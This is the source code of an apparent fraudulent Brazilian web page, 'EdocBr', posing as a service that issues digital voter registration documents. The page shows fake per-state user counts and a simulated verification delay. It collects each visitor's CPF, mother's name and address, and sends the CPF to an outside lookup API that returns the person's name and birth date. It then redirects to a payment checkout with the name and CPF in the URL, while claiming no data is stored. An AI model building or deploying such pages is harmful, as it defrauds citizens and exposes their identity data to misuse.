                            <option value="MA">Maranhão (MA)</option>
                            <option value="MT">Mato Grosso (MT)</option>
                            <option value="MS">Mato Grosso do Sul (MS)</option>
                            <option value="MG">Minas Gerais (MG)</option>
                            <option value="PA">Pará (PA)</option>
                            <option value="PB">Paraíba (PB)</option>
                            <option value="PR">Paraná (PR)</option>
                            <option value="PE">Pernambuco (PE)</option>
                            <option value="PI">Piauí (PI)</option>
                            <option value="RJ">Rio de Janeiro (RJ)</option>
                            <option value="RN">Rio Grande do Norte (RN)</option>
                            <option value="RS">Rio Grande do Sul (RS)</option>
                            <option value="RO">Rondônia (RO)</option>
                            <option value="RR">Roraima (RR)</option>
                            <option value="SC">Santa Catarina (SC)</option>
                            <option value="SP">São Paulo (SP)</option>
                            <option value="SE">Sergipe (SE)</option>
                            <option value="TO">Tocantins (TO)</option>
                        </select>
                        <p class="text-xs text-gray-500 mt-1">Selecione o estado onde deseja exercer seu direito ao voto.</p>
                    </div>
                    <button onclick="validarInformacoesIniciais()" class="btn-primary">
                        <i class="fas fa-arrow-right mr-2"></i> Próximo
                    </button>
                    <div id="resultadoInicial" class="mt-2 text-center"></div>
                </div>

                <!-- Step 2: Análise do Estado -->
                <div class="step" id="step2">
                    <h2 class="text-lg font-semibold mb-3 text-center text-gray-800">Analisando Informações</h2>
                    <div class="loading-container">
                        <div class="spinner"></div>
                        <p class="loading-text">Verificando disponibilidade...</p>
                    </div>
                </div>

                <!-- Step 3: CPF and Via Selection -->
                <div class="step" id="step3">
                    <h2 class="text-lg font-semibold mb-3 text-center text-gray-800">Verificação de Dados</h2>
                    <div class="info-message">
                        <p>Facilitamos o processo digital para</p>
                        <p class="big-number" id="usuariosEstado">+3.568</p>
                        <p>usuários desse estado</p>
                    </div>
                    <div class="address-field">
                        <label for="cpfInput" class="block text-xs font-medium text-gray-700 mb-1">Digite o seu CPF *</label>
                        <input type="text" id="cpfInput" placeholder="000.000.000-00" class="input-field" maxlength="14" required>
                        <label for="nomeMaeInput" class="block text-xs font-medium text-gray-700 mb-1">Nome Completo da Mãe *</label>
                        <input type="text" id="nomeMaeInput" placeholder="Nome completo da mãe" class="input-field">
                        <p class="text-xs text-gray-500 mt-1">Não armazenamos seus dados. Consulta 100% segura.</p>
                    </div>
                    <div class="address-field">
                        <label class="block text-xs font-medium text-gray-700 mb-1">Selecione o tipo de via *</label>
                        <div class="radio-field">
                            <input type="radio" name="via" value="Primeira Via" id="via1" required>
                            <label for="via1">Primeira Via</label>
                        </div>
                        <div class="radio-field">
                            <input type="radio" name="via" value="Segunda Via" id="via2">
                            <label for="via2">Segunda Via</label>
                        </div>
                    </div>
                    <button onclick="consultarCPF()" class="btn-primary">
                        <i class="fas fa-search mr-2"></i> Verificar Dados
                    </button>
                    <button onclick="voltarStep(1)" class="btn-secondary">
                        <i class="fas fa-arrow-left mr-2"></i> Voltar
                    </button>
                    <div id="resultadoCPF" class="mt-2 text-center"></div>
                </div>

                <!-- Step 4: Display Results -->
                <div class="step" id="step4">
                    <h2 class="text-lg font-semibold mb-3 text-center text-gray-800">Confirme seus Dados</h2>
                    <div class="preview-box">
                        <h3 class="text-sm font-semibold mb-2 text-gray-800">Dados Pessoais</h3>
                        <div><strong>Nome Completo:</strong> <span id="nomeCompleto" class="font-medium"></span></div>
                        <div><strong>Data de Nascimento:</strong> <span id="dataNascimento" class="font-medium"></span></div>
                        <div><strong>Nome da Mãe:</strong> <span id="nomeMaeCompleto" class="font-medium"></span></div>
                        <div><strong>Tipo de eDoc:</strong> <span id="viaSelecionada" class="font-medium"></span></div>
                    </div>
                    <div class="preview-box">
                        <h3 class="text-sm font-semibold mb-2 text-gray-800">Informações Eleitorais</h3>
                        <div><strong>Cidade Natal:</strong> <span id="cidadeNatalExibir" class="font-medium"></span></div>
                        <div><strong>Estado onde votará:</strong> <span id="estadoVotoExibir" class="font-medium"></span></div>
                    </div>
                    <div class="btn-group">
                        <button onclick="proximoStep(5)" class="btn-primary">
                            <i class="fas fa-arrow-right mr-2"></i> Prosseguir
                        </button>
                        <button onclick="finalizar()" class="btn-primary">
                            <i class="fas fa-redo mr-2"></i> Nova Consulta
                        </button>
                        <button onclick="voltarStep(3)" class="btn-secondary">
                            <i class="fas fa-arrow-left mr-2"></i> Voltar
                        </button>
                    </div>
                </div>

                <!-- Step 5: Address Details -->
                <div class="step" id="step5">
                    <h2 class="text-lg font-semibold mb-3 text-center text-gray-800">Informações de Endereço</h2>
                    <div class="address-field">
                        <label for="cepInput" class="block text-xs font-medium text-gray-700 mb-1">CEP *</label>
                        <input type="text" id="cepInput" placeholder="00000-000" class="input-field" maxlength="9">
                    </div>
                    <div class="address-field">
                        <label for="logradouro" class="block text-xs font-medium text-gray-700 mb-1">Logradouro *</label>
                        <input type="text" id="logradouro" class="input-field" disabled>
                    </div>
                    <div class="address-grid">
                        <div class="address-field">
                            <label for="numero" class="block text-xs font-medium text-gray-700 mb-1">Número *</label>
                            <input type="text" id="numero" class="input-field">
                        </div>
                        <div class="address-field">
                            <label for="complemento" class="block text-xs font-medium text-gray-700 mb-1">Complemento</label>
                            <input type="text" id="complemento" class="input-field" placeholder="Apto, Casa, etc.">
                        </div>
                    </div>
                    <div class="address-field">
                        <label for="bairro" class="block text-xs font-medium text-gray-900 mb-1">Bairro *</label>
                        <input type="text" id="bairro" class="input-field" disabled>
                    </div>
                    <div class="address-grid">
                        <div class="address-field">
                            <label for="cidade" class="block text-xs font-medium text-gray-700 mb-1">Cidade *</label>
                            <input type="text" id="cidade" class="input-field" disabled>
                        </div>
                        <div class="address-field">
                            <label for="uf" class="block text-xs font-medium text-gray-700 mb-1">Estado *</label>
                            <input type="text" id="uf" class="input-field" style="text-transform: uppercase;" disabled>
                        </div>
                    </div>
                    <div class="btn-group">
                        <button onclick="proximoStep(6)" class="btn-primary">
                            <i class="fas fa-arrow-right mr-2"></i> Prosseguir
                        </button>
                        <button onclick="voltarStep(4)" class="btn-secondary">
                            <i class="fas fa-arrow-left mr-2"></i> Voltar
                        </button>
                    </div>
                    <div id="resultadoEndereco" class="mt-2 text-center"></div>
                </div>

                <!-- Step 6: Confirmation -->
                <div class="step" id="step6">
                    <h2 class="text-lg font-semibold mb-3 text-center text-gray-800">Confirmação Final</h2>
                    <div class="preview-box">
                        <h3 class="text-sm font-semibold mb-2 text-gray-800">Dados Pessoais</h3>
                        <div><strong>Nome Completo:</strong> <span id="nomeCompletoFinal" class="font-medium"></span></div>
                        <div><strong>Data de Nascimento:</strong> <span id="dataNascimentoFinal" class="font-medium"></span></div>
                        <div><strong>Nome da Mãe:</strong> <span id="nomeMaeFinal" class="font-medium"></span></div>
                        <div><strong>Tipo de eDoc:</strong> <span id="viaSelecionadaFinal" class="font-medium"></span></div>
                    </div>
                    <div class="preview-box">
                        <h3 class="text-sm font-semibold mb-2 text-gray-800">Informações Eleitorais</h3>
                        <div><strong>Cidade Natal:</strong> <span id="cidadeNatalFinal" class="font-medium"></span></div>
                        <div><strong>Estado onde votará:</strong> <span id="estadoVotoFinal" class="font-medium"></span></div>
                    </div>
                    <div class="preview-box">
                        <h3 class="text-sm font-semibold mb-2 text-gray-800">Endereço</h3>
                        <div><strong>CEP:</strong> <span id="cepFinal" class="font-medium"></span></div>
                        <div><strong>Logradouro:</strong> <span id="logradouroFinal" class="font-medium"></span></div>
                        <div><strong>Número:</strong> <span id="numeroFinal" class="font-medium"></span></div>
                        <div><strong>Complemento:</strong> <span id="complementoFinal" class="font-medium"></span></div>
                        <div><strong>Bairro:</strong> <span id="bairroFinal" class="font-medium"></span></div>
                        <div><strong>Cidade:</strong> <span id="cidadeFinal" class="font-medium"></span></div>
                        <div><strong>Estado:</strong> <span id="ufFinal" class="font-medium"></span></div>
                    </div>
                    <div class="btn-group">
                        <button onclick="enviarSolicitacao()" class="btn-primary">
                            <i class="fas fa-check-circle mr-2"></i> Solicitar e-Doc
                        </button>
                        <button onclick="voltarStep(5)" class="btn-secondary">
                            <i class="fas fa-arrow-left mr-2"></i> Voltar
                        </button>
                    </div>
                    <div id="resultadoConfirmacao" class="mt-2 text-center"></div>
                </div>
            </div>
        </main>
    </div>

    <footer class="footer">
        <div class="copyright">
            <p>EdocBr © 2025 - Todos os direitos reservados</p>
            <p class="mt-1">
                <a href="/termos">Termos de Uso</a> | 
                <a href="/privacidade">Política de Privacidade</a>
            </p>
        </div>
    </footer>

    <script>
        let consultaData = null;
        let enderecoData = null;
        let informacoesIniciais = null;

        // Números de usuários por estado (simulado)
        const usuariosPorEstado = {
            'AC': 1245, 'AL': 2156, 'AP': 987, 'AM': 3421, 'BA': 8765,
            'CE': 6543, 'DF': 4321, 'ES': 3890, 'GO': 5234, 'MA': 4567,
            'MT': 3456, 'MS': 2890, 'MG': 9876, 'PA': 5678, 'PB': 3234,
            'PR': 7654, 'PE': 6789, 'PI': 2345, 'RJ': 8901, 'RN': 3456,
            'RS': 7890, 'RO': 2123, 'RR': 876, 'SC': 5678, 'SP': 12456,
            'SE': 2234, 'TO': 1876
        };

        // Mobile Menu Toggle
        const mobileMenuBtn = document.getElementById('mobileMenuBtn');
        const navMenu = document.getElementById('navMenu');

        mobileMenuBtn.addEventListener('click', () => {
            navMenu.classList.toggle('active');
            mobileMenuBtn.innerHTML = navMenu.classList.contains('active') 
                ? '<i class="fas fa-times"></i>' 
                : '<i class="fas fa-bars"></i>';
        });

        // Máscara de CPF
        document.getElementById('cpfInput').addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 11) value = value.slice(0, 11);
            value = value.replace(/^(\d{3})(\d)/, '$1.$2')
                        .replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3')
                        .replace(/\.(\d{3})(\d)/, '.$1-$2');
            e.target.value = value;
        });

        // Máscara de CEP e busca automática
        document.getElementById('cepInput').addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 8) value = value.slice(0, 8);
            value = value.replace(/^(\d{5})(\d)/, '$1-$2');
            e.target.value = value;

            if (value.replace(/\D/g, '').length === 8) {
                buscarCEP();
            } else {
                document.getElementById('logradouro').value = '';
                document.getElementById('bairro').value = '';
                document.getElementById('cidade').value = '';
                document.getElementById('uf').value = '';
                document.getElementById('complemento').value = '';
            }
        });

        // Validação de CPF
        function validarCPF(cpf) {
            cpf = cpf.replace(/[^\d]/g, '');
            if (cpf.length !== 11) return false;
            if (/^(\d)\1{10}$/.test(cpf)) return false;
            let soma = 0;
            for (let i = 0; i < 9; i++) soma += parseInt(cpf.charAt(i)) * (10 - i);
            let resto = (soma * 10) % 11;
            if (resto === 10 || resto === 11) resto = 0;
            if (resto !== parseInt(cpf.charAt(9))) return false;
            soma = 0;
            for (let i = 0; i < 10; i++) soma += parseInt(cpf.charAt(i)) * (11 - i);
            resto = (soma * 10) % 11;
            if (resto === 10 || resto === 11) resto = 0;
            return resto === parseInt(cpf.charAt(10));
        }

        // Exibir mensagens de feedback
        function showMessage(elementId, type, message) {
            const resultadoDiv = document.getElementById(elementId);
            resultadoDiv.innerHTML = `<p class="${type}">${message}</p>`;
            setTimeout(() => resultadoDiv.innerHTML = '', 3000);
        }

        // Validar informações iniciais (Step 1)
        function validarInformacoesIniciais() {
            const cidadeNatal = document.getElementById('cidadeNatalInput').value.trim();
            const estadoVoto = document.getElementById('estadoVotoInput').value;
            const resultadoDiv = document.getElementById('resultadoInicial');

            if (!cidadeNatal || cidadeNatal.length < 3) {
                showMessage('resultadoInicial', 'error', 'Por favor, informe sua cidade natal');
                return;
            }

            if (!estadoVoto) {
                showMessage('resultadoInicial', 'error', 'Por favor, selecione o estado onde quer votar');
                return;
            }

            informacoesIniciais = {
                cidadeNatal: cidadeNatal,
                estadoVoto: estadoVoto
            };

            // Ir para step 2 (análise)
            proximoStep(2);

            // Simular análise de 2-3 segundos
            setTimeout(() => {
                // Atualizar número de usuários
                const numUsuarios = usuariosPorEstado[estadoVoto] || 3568;
                document.getElementById('usuariosEstado').textContent = `+${numUsuarios.toLocaleString('pt-BR')}`;

                // Ir para step 3
                proximoStep(3);
            }, 2500);
        }

        async function consultarCPF() {
            const cpfInput = document.getElementById('cpfInput').value;
            const nomeMaeInput = document.getElementById('nomeMaeInput').value;
            const viaSelecionada = document.querySelector('input[name="via"]:checked');
            const resultadoDiv = document.getElementById('resultadoCPF');
            const consultButton = document.querySelector('#step3 .btn-primary');
            consultButton.disabled = true;

            resultadoDiv.innerHTML = `
                <div class="loading-container">
                    <div class="spinner"></div>
                    <p class="loading-text">Verificando Dados...</p>
                </div>
            `;

            const cpf = cpfInput.replace(/\D/g, '');
            const cpfPattern = /^\d{3}\.\d{3}\.\d{3}-\d{2}$/;

            if (!cpfInput) {
                consultButton.disabled = false;
                showMessage('resultadoCPF', 'error', 'Por favor, informe seu CPF');
                return;
            } else if (!cpfPattern.test(cpfInput)) {
                consultButton.disabled = false;
                showMessage('resultadoCPF', 'error', 'Formato de CPF inválido. Use: 000.000.000-00');
                return;
            } else if (!validarCPF(cpfInput)) {
                consultButton.disabled = false;
                showMessage('resultadoCPF', 'error', 'CPF inválido. Verifique os dígitos.');
                return;
            } else if (!nomeMaeInput || nomeMaeInput.trim().length < 3) {
                consultButton.disabled = false;
                showMessage('resultadoCPF', 'error', 'Por favor, informe o nome completo da mãe');
                return;
            } else if (!viaSelecionada) {
                consultButton.disabled = false;
                showMessage('resultadoCPF', 'error', 'Por favor, selecione o tipo de via (Primeira ou Segunda Via)');
                return;
            }

            try {
                const response = await fetch(`https://searchapi.dnnl.live/consulta?cpf=${cpf}&token_api=5621`, {
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });

                if (!response.ok) {
                    throw new Error('Erro ao consultar CPF');
                }

                const apiData = await response.json();
                console.log('Resposta da API:', apiData);

                const dadosApi = apiData.dados && apiData.dados[0];

                if (!dadosApi || !dadosApi.NOME || !dadosApi.NASC) {
                    consultButton.disabled = false;
                    showMessage('resultadoCPF', 'error', 'Dados não encontrados para este CPF');
                    return;
                }

                consultaData = {
                    cpf: dadosApi.CPF || cpf,
                    nome_completo: dadosApi.NOME,
                    data_nascimento: dadosApi.NASC,
                    nome_mae: nomeMaeInput.trim(),
                    via: viaSelecionada.value + " Título Eleitor"
                };

                document.getElementById('nomeCompleto').textContent = consultaData.nome_completo.toUpperCase();
                document.getElementById('dataNascimento').textContent = consultaData.data_nascimento;
                document.getElementById('nomeMaeCompleto').textContent = consultaData.nome_mae.toUpperCase();
                document.getElementById('viaSelecionada').textContent = consultaData.via;

                // Exibir informações eleitorais
                document.getElementById('cidadeNatalExibir').textContent = informacoesIniciais.cidadeNatal.toUpperCase();
                const estadoNome = document.getElementById('estadoVotoInput').selectedOptions[0].text;
                document.getElementById('estadoVotoExibir').textContent = estadoNome;

                consultButton.disabled = false;
                resultadoDiv.innerHTML = '';
                proximoStep(4);

            } catch (error) {
                consultButton.disabled = false;
                showMessage('resultadoCPF', 'error', `Erro na consulta: ${error.message}`);
            }
        }

        async function buscarCEP() {
            const cepInput = document.getElementById('cepInput').value;
            const resultadoDiv = document.getElementById('resultadoEndereco');
            const cep = cepInput.replace(/\D/g, '');

            if (cep.length !== 8) {
                return;
            }

            resultadoDiv.innerHTML = `
                <div class="loading-container">
                    <div class="spinner"></div>
                    <p class="loading-text">Buscando CEP...</p>
                </div>
            `;

            try {
                const response = await fetch(`https://brasilapi.com.br/api/cep/v1/${cep}`);

                if (!response.ok) {
                    throw new Error('CEP não encontrado');
                }

                const data = await response.json();

                enderecoData = {
                    cep: cep,
                    logradouro: data.street || '',
                    complemento: '',
                    bairro: data.neighborhood || '',
                    cidade: data.city || '',
                    uf: data.state || ''
                };

                document.getElementById('logradouro').value = enderecoData.logradouro;
                document.getElementById('bairro').value = enderecoData.bairro;
                document.getElementById('cidade').value = enderecoData.cidade;
                document.getElementById('uf').value = enderecoData.uf;

                resultadoDiv.innerHTML = '';
                showMessage('resultadoEndereco', 'success', '✓ CEP encontrado!');

            } catch (error) {
                try {
                    const response2 = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
                    const data2 = await response2.json();

                    if (data2.erro === true) {
                        throw new Error('CEP não encontrado');
                    }

                    enderecoData = {
                        cep: data2.cep,
                        logradouro: data2.logradouro || '',
                        complemento: data2.complemento || '',
                        bairro: data2.bairro || '',
                        cidade: data2.localidade || '',
                        uf: data2.uf || ''
                    };

                    document.getElementById('logradouro').value = enderecoData.logradouro;
                    document.getElementById('bairro').value = enderecoData.bairro;
                    document.getElementById('cidade').value = enderecoData.cidade;
                    document.getElementById('uf').value = enderecoData.uf;
                    if (enderecoData.complemento) {
                        document.getElementById('complemento').value = enderecoData.complemento;
                    }

                    resultadoDiv.innerHTML = '';
                    showMessage('resultadoEndereco', 'success', '✓ CEP encontrado!');

                } catch (error2) {
                    console.error('Erro ao buscar CEP:', error2);
                    showMessage('resultadoEndereco', 'error', 'CEP não encontrado. Verifique e tente novamente.');
                    limparCamposEndereco();
                }
            }
        }

        function limparCamposEndereco() {
            document.getElementById('logradouro').value = '';
            document.getElementById('bairro').value = '';
            document.getElementById('cidade').value = '';
            document.getElementById('uf').value = '';
            enderecoData = null;
        }

        function enviarSolicitacao() {
            const numero = document.getElementById('numero').value;
            const resultadoDiv = document.getElementById('resultadoConfirmacao');

            if (!numero) {
                showMessage('resultadoConfirmacao', 'error', 'Por favor, informe o número');
                return;
            }

            if (!enderecoData || !enderecoData.cep) {
                showMessage('resultadoConfirmacao', 'error', 'Por favor, informe um CEP válido');
                return;
            }

            if (!consultaData || !consultaData.nome_completo || !consultaData.cpf) {
                showMessage('resultadoConfirmacao', 'error', 'Dados pessoais não encontrados. Por favor, refaça a consulta.');
                return;
            }

            resultadoDiv.innerHTML = `
                <div class="loading-container">
                    <div class="spinner"></div>
                    <p class="loading-text">Carregando informações...</p>
                </div>
            `;

            const checkoutUrl = `https://pay.docfacil.digital/v7R0glkabeVGVr9?nome=${encodeURIComponent(consultaData.nome_completo)}&cpf=${consultaData.cpf}`;
            console.log('URL de checkout gerado:', checkoutUrl);

            setTimeout(() => {
                resultadoDiv.innerHTML = '<p class="success">Solicitação enviada com sucesso! Redirecionando para o pagamento...</p>';

                document.getElementById('cepInput').value = '';
                document.getElementById('logradouro').value = '';
                document.getElementById('numero').value = '';
                document.getElementById('complemento').value = '';
                document.getElementById('bairro').value = '';
                document.getElementById('cidade').value = '';
                document.getElementById('uf').value = '';

                setTimeout(() => {
                    window.location.href = checkoutUrl;
                }, 500);
            }, 500);
        }

        function proximoStep(step) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById(`step${step}`).classList.add('active');

            if (step === 6) {
                document.getElementById('nomeCompletoFinal').textContent = consultaData.nome_completo.toUpperCase();
                document.getElementById('dataNascimentoFinal').textContent = consultaData.data_nascimento;
                document.getElementById('nomeMaeFinal').textContent = consultaData.nome_mae.toUpperCase();
                document.getElementById('viaSelecionadaFinal').textContent = consultaData.via;

                document.getElementById('cidadeNatalFinal').textContent = informacoesIniciais.cidadeNatal.toUpperCase();
                const estadoNome = document.getElementById('estadoVotoInput').selectedOptions[0].text;
                document.getElementById('estadoVotoFinal').textContent = estadoNome;

                document.getElementById('cepFinal').textContent = enderecoData.cep;
                document.getElementById('logradouroFinal').textContent = enderecoData.logradouro;
                document.getElementById('numeroFinal').textContent = document.getElementById('numero').value;
                document.getElementById('complementoFinal').textContent = document.getElementById('complemento').value || 'Não informado';
                document.getElementById('bairroFinal').textContent = enderecoData.bairro;
                document.getElementById('cidadeFinal').textContent = enderecoData.cidade;
                document.getElementById('ufFinal').textContent = enderecoData.uf;
            }

            window.scrollTo({ top: document.getElementById('step1').offsetTop - 80, behavior: 'smooth' });
        }

        function voltarStep(step) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById(`step${step}`).classList.add('active');

            window.scrollTo({ top: document.getElementById('step1').offsetTop - 80, behavior: 'smooth' });
        }

        function finalizar() {
            document.getElementById('cidadeNatalInput').value = '';
            document.getElementById('estadoVotoInput').value = '';

            document.getElementById('cpfInput').value = '';
            document.getElementById('nomeMaeInput').value = '';
            document.querySelectorAll('input[name="via"]').forEach(radio => {
                radio.checked = false;
            });
            document.getElementById('nomeCompleto').textContent = '';
            document.getElementById('dataNascimento').textContent = '';
            document.getElementById('nomeMaeCompleto').textContent = '';
            document.getElementById('viaSelecionada').textContent = '';

            document.getElementById('cepInput').value = '';
            document.getElementById('logradouro').value = '';
            document.getElementById('numero').value = '';
            document.getElementById('complemento').value = '';
            document.getElementById('bairro').value = '';
            document.getElementById('cidade').value = '';
            document.getElementById('uf').value = '';

            consultaData = null;
            enderecoData = null;
            informacoesIniciais = null;
            proximoStep(1);
        }
    </script>
</body>
</html>"},"elements":[],"widgetType":"html"}],"isInner":false}]

{"timeout":1770745458,"value":{"content":"<div class="elementor-element elementor-element-461a7a2 e-con-full e-flex e-con e-parent" data-id="461a7a2" data-element_type="container">
				<div class="elementor-element elementor-element-690bdf6 elementor-widget elementor-widget-html" data-id="690bdf6" data-element_type="widget" data-widget_type="html.default">
					<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EdocBr | Solicitação de e-Doc</title>
    <meta name="description" content="Auxílio do EdocBr de forma prática e segura.">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #027d6c;
            --secondary-color: #10b981;
            --light-color: #ecfdf5;
            --dark-color: #064e3b;
            --text-color: #1f2937;
            --accent-color: #34d399;
        }
        * {
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(180deg, #f3f4f6 0%, #e5e7eb 100%);
            color: var(--text-color);
            line-height: 1.6;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .main-wrapper {
            flex: 1;
            max-width: 1280px;
            margin: 0 auto;
            width: 100%;
            padding: 0 0.5rem;
        }
        .header {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            padding: 0.75rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
            border-bottom-left-radius: 10px;
            border-bottom-right-radius: 10px;
        }
        .logo-container {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        .logo {
            width: 32px;
            height: 32px;
            object-fit: contain;
            transition: transform 0.3s ease;
        }
        .logo:hover {
            transform: scale(1.1);
        }
        .brand-name {
            font-weight: 800;
            font-size: 1.1rem;
            letter-spacing: -0.025em;
        }
        .mobile-menu-btn {
            background: none;
            border: none;
            color: white;
            font-size: 1.25rem;
            cursor: pointer;
            transition: transform 0.3s ease;
        }
        .mobile-menu-btn:hover {
            transform: rotate(90deg);
        }
        .nav-menu {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(135deg, var(--primary-color), var(--dark-color));
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            transform: translateY(-100%);
            transition: transform 0.3s ease;
            z-index: 99;
            padding: 0.75rem;
        }
        .nav-menu.active {
            transform: translateY(0);
        }
        .nav-menu ul {
            list-style: none;
            padding: 0;
            margin: 0;
            display: flex;
            flex-direction: column;
            gap: 1rem;
            width: 100%;
            text-align: center;
        }
        .nav-menu ul li a {
            color: white;
            text-decoration: none;
            font-size: 1rem;
            font-weight: 600;
            padding: 0.5rem;
            display: block;
            transition: all 0.3s ease;
        }
        .nav-menu ul li a:hover {
            color: var(--light-color);
            background: rgba(255, 255, 255, 0.1);
            border-radius: 6px;
        }
        .main-content {
            padding: 1.5rem 0.25rem;
        }
        .container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.06);
            padding: 1rem;
            width: 95%;
            margin: 0 auto;
            transition: transform 0.3s ease;
        }
        .container:hover {
            transform: translateY(-3px);
        }
        .section-title {
            font-size: 1.4rem;
            font-weight: 800;
            text-align: center;
            color: var(--primary-color);
            margin-bottom: 1rem;
            position: relative;
        }
        .section-title::after {
            content: '';
            position: absolute;
            bottom: -0.4rem;
            left: 50%;
            transform: translateX(-50%);
            width: 60px;
            height: 3px;
            background: linear-gradient(to right, var(--primary-color), var(--accent-color));
            border-radius: 2px;
        }
        .btn-primary {
            background: var(--primary-color);
            color: white;
            padding: 0.875rem 1.75rem;
            border-radius: 6px;
            font-weight: 600;
            font-size: 0.9rem;
            text-align: center;
            display: block;
            text-decoration: none;
            border: none;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            margin: 0.5rem 0;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.08);
        }
        .btn-primary:hover:not(:disabled) {
            background: var(--dark-color);
            transform: translateY(-2px);
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }
        .btn-primary:disabled {
            background: #d1d5db;
            cursor: not-allowed;
        }
        .btn-secondary {
            background: #6b7280;
            color: white;
            padding: 0.75rem 1.5rem;
            border-radius: 6px;
            font-weight: 600;
            font-size: 0.9rem;
            text-align: center;
            display: block;
            text-decoration: none;
            border: none;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            margin: 0.5rem 0;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.08);
        }
        .btn-secondary:hover {
            background: #4b5563;
            transform: translateY(-2px);
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }
        .input-field, .select-field {
            width: 100%;
            padding: 0.6rem;
            border: 1px solid #d1d5db;
            border-radius: 6px;
            font-size: 16px;
            margin-bottom: 0.5rem;
            transition: all 0.3s ease;
            background: #f9fafb;
            box-sizing: border-box;
        }
        .input-field:focus, .select-field:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: 0 0 0 2px rgba(2, 125, 108, 0.15);
        }
        .input-field:disabled {
            background: #f3f4f6;
            color: #6b7280;
        }
        .radio-field {
            display: flex;
            align-items: center;
            margin-bottom: 0.4rem;
            gap: 0.4rem;
        }
        .radio-field input[type="radio"] {
            accent-color: var(--primary-color);
            width: 1rem;
            height: 1rem;
        }
        .radio-field label {
            font-size: 0.9rem;
            color: var(--text-color);
        }
        .preview-box {
            border: 1px solid #e5e7eb;
            border-radius: 6px;
            padding: 1rem;
            background: #f9fafb;
            margin-bottom: 0.75rem;
            transition: all 0.3s ease;
        }
        .preview-box:hover {
            border-color: var(--accent-color);
        }
        .preview-box div {
            margin-bottom: 0.4rem;
            color: var(--text-color);
            font-size: 0.9rem;
        }
        .spinner {
            border: 3px solid #f3f4f6;
            border-top: 3px solid var(--primary-color);
            border-radius: 50%;
            width: 28px;
            height: 28px;
            animation: spin 1s linear infinite;
            margin: 0.75rem auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .error {
            color: #dc2626;
            font-weight: 600;
            font-size: 0.8rem;
        }
        .success {
            color: var(--primary-color);
            font-weight: 600;
            font-size: 0.8rem;
        }
        .step {
            display: none;
        }
        .step.active {
            display: block;
            animation: fadeIn 0.5s ease-in;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .footer {
            background: linear-gradient(135deg, var(--primary-color), var(--dark-color));
            color: white;
            padding: 1.5rem 0.75rem;
            text-align: center;
            width: 100%;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
        }
        .footer a {
            color: var(--light-color);
            text-decoration: underline;
            transition: color 0.3s ease;
        }
        .footer a:hover {
            color: white;
        }
        .copyright {
            margin-top: 0.75rem;
            font-size: 0.8rem;
            color: #d1fae5;
        }
        .address-field {
            margin-bottom: 0.5rem;
        }
        .address-field label {
            display: block;
            margin-bottom: 0.4rem;
            font-weight: 600;
            color: var(--text-color);
            font-size: 0.9rem;
        }
        .address-grid {
            display: grid;
            gap: 0.5rem;
        }
        .loading-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 0.4rem;
        }
        .loading-text {
            font-weight: 600;
            color: var(--primary-color);
            font-size: 0.9rem;
        }
        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
            justify-content: center;
        }
        .info-message {
            background: var(--light-color);
            border-left: 4px solid var(--primary-color);
            padding: 1rem;
            border-radius: 6px;
            margin: 1rem 0;
            text-align: center;
        }
        .info-message p {
            margin: 0;
            color: var(--dark-color);
            font-weight: 600;
            font-size: 0.95rem;
        }
        .info-message .big-number {
            font-size: 1.5rem;
            font-weight: 800;
            color: var(--primary-color);
            margin: 0.5rem 0;
        }
        @media (min-width: 768px) {
            .header {
                padding: 1rem 1.5rem;
            }
            .mobile-menu-btn {
                display: none;
            }
            .nav-menu {
                position: static;
                background: transparent;
                transform: none;
                flex-direction: row;
                justify-content: flex-end;
                padding: 0;
            }
            .nav-menu ul {
                flex-direction: row;
                gap: 1.5rem;
                width: auto;
            }
            .nav-menu ul li a {
                font-size: 0.9rem;
            }
            .main-content {
                padding: 2.5rem 1rem;
            }
            .container {
                padding: 2rem;
                border-radius: 12px;
                max-width: 720px;
            }
            .section-title {
                font-size: 1.8rem;
            }
            .btn-primary {
                padding: 0.875rem 2rem;
                font-size: 1rem;
            }
            .btn-secondary {
                padding: 0.875rem 2rem;
                font-size: 1rem;
            }
            .btn-group {
                flex-direction: row;
                gap: 1rem;
            }
